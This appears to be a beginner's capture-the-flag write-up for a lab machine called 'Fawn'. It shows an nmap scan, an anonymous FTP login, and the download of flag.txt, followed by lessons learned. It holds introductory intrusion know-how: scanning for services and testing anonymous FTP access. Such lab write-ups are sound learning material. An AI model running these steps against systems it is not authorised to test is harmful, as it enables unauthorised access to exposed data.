# Fawn

### Overview

- Platform: Linux
- Difficulty: Very Easy
- Completed: August 4, 2026

---

### Objective

Identify the FTP service, authenticate using anonymous access, and retrieve the flag.

---

### Enumeration

#### Initial Scan

```bash
nmap <target-ip>
```

Results:

```text
21/tcp open ftp
```

Performed additional service enumeration:

```bash
nmap -sC -sV <target-ip>
```

Purpose:

- `-sC` executes default Nmap Scripting Engine (NSE) scripts.
- `-sV` identifies service versions.
- Provides additional FTP information such as anonymous login detection.

---

### Exploitation

Connect to the FTP service.

```bash
ftp <target-ip>
```

Authenticate anonymously.

```text
Username: anonymous
Password: <Press Enter>
```

List available files.

```text
ls
```

Download the flag.

```text
get flag.txt
```

Exit the FTP session.

```text
bye
```

Read the downloaded file.

```bash
cat flag.txt
```

---

### Flag

Successfully downloaded `flag.txt` from the FTP server using anonymous authentication.

---

### What I Learned

- FTP runs on TCP port 21.
- Always test for anonymous FTP access during enumeration.
- FTP has its own command set separate from the Linux shell.
- `get` downloads files from the FTP server.
- `nmap -sC -sV` is a better starting scan than a basic `nmap`.

---

### Tools Used

- Kali Linux
- Nmap
- FTP Client

---

### Commands Used

#### Linux

```bash
nmap <target-ip>

nmap -sC -sV <target-ip>

ftp <target-ip>

cat flag.txt
```

#### FTP

```text
ls
pwd
get flag.txt
help
?
bye
